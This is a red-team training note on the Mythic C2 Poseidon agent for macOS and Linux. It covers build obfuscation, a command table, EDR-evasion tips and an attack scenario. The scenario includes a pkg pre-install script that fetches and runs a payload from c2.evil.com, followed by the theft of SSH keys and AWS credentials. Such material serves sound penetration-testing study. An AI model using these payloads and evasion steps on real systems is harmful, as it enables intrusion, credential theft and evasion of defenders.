---
tags: [mythic, c2, payloads, red-team, vapt]
difficulty: advanced
module: "97 - Mythic C2 Custom Agents and Payload Generation"
topic: "97.06 Poseidon Agent macOS and Linux C2"
---

# Poseidon Agent for macOS and Linux C2 Operations

## Introduction
Poseidon is an advanced, post-exploitation agent for the Mythic C2 framework written entirely in Golang. It is specifically designed for macOS and Linux environments, bridging the gap left by traditional Windows-centric C2 frameworks. By leveraging the cross-platform capabilities of Go, Poseidon offers a statically linked, standalone binary that requires no external dependencies on the target system. 

In modern Red Team operations, macOS is increasingly common among developers and executives, while Linux remains the backbone of corporate infrastructure. Poseidon allows operators to seamlessly control these heterogeneous environments from a unified Mythic interface.

## Core Capabilities
- **Cross-Compilation**: Native generation of ELF binaries for Linux and Mach-O binaries for macOS (x64 and ARM64).
- **Multiple C2 Profiles**: Supports HTTP, HTTPS, and WebSockets for varying network egress constraints.
- **Dynamic Module Loading**: Although statically compiled, Poseidon utilizes Go's reflection and modular design to execute complex post-exploitation tasks.
- **SOCKS5 Support**: Built-in routing capabilities to pivot through compromised UNIX-like hosts.
- **Keylogging**: Native macOS keylogging leveraging CoreGraphics APIs.
- **File System Interaction**: Advanced file upload, download, and execution capabilities.

## Architecture and Execution Flow

The following diagram illustrates how Poseidon interacts with the Mythic server and handles tasking:

```text
+-------------------+       +-----------------------+       +-------------------+
|                   |       |                       |       |                   |
|   Mythic Server   | <---> |   HTTP/S or WSS C2    | <---> |   Poseidon Agent  |
|   (UI / Backend)  |       |   Profile Container   |       |   (macOS/Linux)   |
|                   |       |                       |       |                   |
+-------------------+       +-----------------------+       +-------------------+
                                                                     |
                                                                     v
                                                          +-------------------+
                                                          |  Task Execution   |
                                                          |  Engine (Golang)  |
                                                          +-------------------+
                                                          | - Keylogger       |
                                                          | - SOCKS5 Proxy    |
                                                          | - Shell Exec      |
                                                          | - File System API |
                                                          +-------------------+
```

## Compilation and Deployment Strategies

Poseidon's build process is integrated directly into the Mythic UI, but operators must understand the underlying `GOOS` and `GOARCH` mechanics to optimize payloads.

### Supported Build Targets
*   `darwin/amd64` (Intel Macs)
*   `darwin/arm64` (Apple Silicon / M1 / M2)
*   `linux/amd64` (Standard Linux Servers)
*   `linux/arm64` (IoT / Cloud ARM Instances)

### Obfuscation and Stripping
By default, Go binaries are notoriously large and easy to signature due to embedded symbols and type information. 
When generating Poseidon, ensure you:
1.  **Strip Symbols**: Use the `-ldflags "-s -w"` compilation flags to remove debug symbols.
2.  **Use Garble**: For advanced engagements, consider exporting the Poseidon source from Mythic and compiling it with `garble`, a Go obfuscator that scrambles package names, struct tags, and string literals.

## Detailed Command Reference

Operators interact with Poseidon via the Mythic Web UI or CLI. Below are critical commands for macOS/Linux environments:

| Command | Arguments | Description | OPSEC Note |
| :--- | :--- | :--- | :--- |
| `shell` | `<command>` | Executes a standard bash/sh command. | Spawns `/bin/sh -c`, highly monitored by EDR (e.g., Jamf Protect). |
| `execute_memory` | `<mach-o/elf>` | Runs a binary directly from memory without touching disk. | Bypasses traditional static file scanning AV. |
| `keylog` | `<time>` | Starts the CoreGraphics keylogger on macOS. | Requires Accessibility permissions (TCC bypass needed). |
| `socks` | `<port>` | Starts a SOCKS5 proxy on the agent. | Traffic is tunneled through the active C2 profile (HTTP/WSS). |
| `screencapture` | none | Takes a screenshot of the active desktop. | Only works if a GUI session is active and TCC allows. |
| `download` | `<path>` | Downloads a file from the target. | Chunked transfer to avoid spiking network metrics. |
| `upload` | `<path> <file>` | Uploads a file to the target. | Set timestamps (timestomp) manually after upload. |

## Operational Security (OPSEC)

Operating on macOS and Linux requires a fundamentally different OPSEC approach than Windows.

### macOS Endpoint Security Framework (ESF)
Modern macOS EDRs leverage the Endpoint Security Framework. Actions like `fork()`, `execve()`, and file drops are deeply monitored. 
- Avoid using the `shell` command frequently. 
- Rely on Go's native OS library functions (e.g., `os.ReadDir`, `os.ReadFile`) rather than spawning `ls` or `cat`.
- Be acutely aware of Transparency, Consent, and Control (TCC). You cannot keylog or screenshot without tricking the user into granting permissions or exploiting a TCC bypass.

### Linux BPF/Auditd
On Linux, `auditd` and eBPF-based sensors (like Tetragon or Falco) will log anomalous execution.
- Rename the Poseidon binary to blend with system processes (e.g., `kworker/u4:2`, `systemd-journald`).
- Execute from temporary filesystems (e.g., `/dev/shm` or `/run/user/1000/`) if memory execution is not viable.

## Real-World Attack Scenario

### Initial Access
A Red Team targets a DevOps engineering team using Apple Silicon MacBooks. A spearphishing email delivers a malicious macOS `.pkg` file disguised as a VPN client update. 

### Execution
Upon execution, a pre-install script within the `.pkg` runs:
```bash
#!/bin/bash
curl -s http://c2.evil.com/update.bin -o /tmp/.ds_store_cache
chmod +x /tmp/.ds_store_cache
/tmp/.ds_store_cache &
rm -f /tmp/.ds_store_cache
```
The payload is an ARM64 Poseidon agent. 

### Post-Exploitation
1. The agent checks in over HTTPS (Port 443) to the Mythic server.
2. The operator immediately lists active processes and discovers `1Password` and `Slack`.
3. Instead of dropping secondary binaries, the operator uses Poseidon's native file extraction to pull SSH keys from `~/.ssh/` and AWS session tokens from `~/.aws/credentials`.
4. The operator initiates a `socks` command on port 9050.
5. Using `proxychains`, the operator tunnels `aws-cli` commands directly through the developer's MacBook, utilizing their authenticated IAM context to pivot into the corporate cloud environment.

## Detection Engineering & Blue Team Evasion

Defenders look for:
- Unusual network connections originating from untrusted binaries.
- Statically linked Go binaries without Apple Developer signatures.
- Processes running from `/tmp/` or user `~/Downloads/` directories.
- Unsigned Mach-O files executing.

Evasion Strategies:
- Ad-hoc sign the payload using `codesign -s - payload.bin` to pass basic Gatekeeper checks if deployed via exploit.
- Embed the agent inside a legitimate application bundle (`.app/Contents/MacOS/`).

## Chaining Opportunities
- Link this agent with internal network scanning: [[04 - Network Reconnaissance via Proxychains]]
- Use stolen credentials to access domain services: [[12 - Lateral Movement via SSH and Kerberos]]

## Related Notes
- [[07 - Medusa Agent Cross-Platform Python C2]]
- [[10 - SOCKS Proxies and Pivoting with Mythic]]
- [[15 - macOS TCC Bypasses and Exploitation]]
